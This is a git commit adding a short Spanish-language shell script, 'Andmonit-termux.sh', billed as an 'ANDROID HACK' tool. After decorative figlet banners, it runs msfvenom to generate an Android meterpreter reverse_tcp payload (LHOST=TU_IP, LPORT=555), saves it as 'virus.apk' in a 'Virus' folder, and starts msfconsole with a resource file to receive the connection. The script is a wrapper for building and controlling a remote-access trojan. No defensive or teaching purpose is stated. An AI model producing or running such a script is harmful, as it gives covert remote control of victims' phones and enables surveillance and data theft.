19e2169569684407000747e25cf2d684ac54bb9b
Genplat <88243361+Genplat@users.noreply.github.com>
2021-08-26 18:02:04 +0000

    ANDMONIT
    Se añadio soporte para termux al 100%

---
+++ Andmonit-termux.sh
@@ -0,0 +1,31 @@
+clear
+figlet ANDMONIT 2.0.3
+echo INICIANDO SERVICIOS:
+echo 	[!] INICIANDO ANDMONIT...
+sleep 5
+clear
+figlet ANDMONIT 2.0.3
+echo INICIANDO SERVICIOS:
+echo 	[!] CARGANDO RECURSOS...
+sleep 3
+echo 	[*]ANDMONIT ANDROID HACK -By Genplat-
+sleep 3
+clear
+figlet ANDMONIT 2.0.3
+echo INICIANDO SERVICIOS:
+echo 	[!] LISTO!
+sleep 2
+clear
+figlet ANDMONIT 2.0.3
+echo SERVICIOS INICIADOS CON EXITO!
+sleep 1
+clear
+figlet ANDMONIT 2.0.3
+echo [!]CREANDO APK...
+cd /home/genplat/Escritorio/Virus
+msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > /home/genplat/Escritorio/Virus/virus.apk
+echo APK CREADA CON EXITO!
+echo [!]MONITOREANDO APK...
+msfconsole -r android.rc
+clear
+echo [!]SESION DE ANDMONIT FINALIZADA
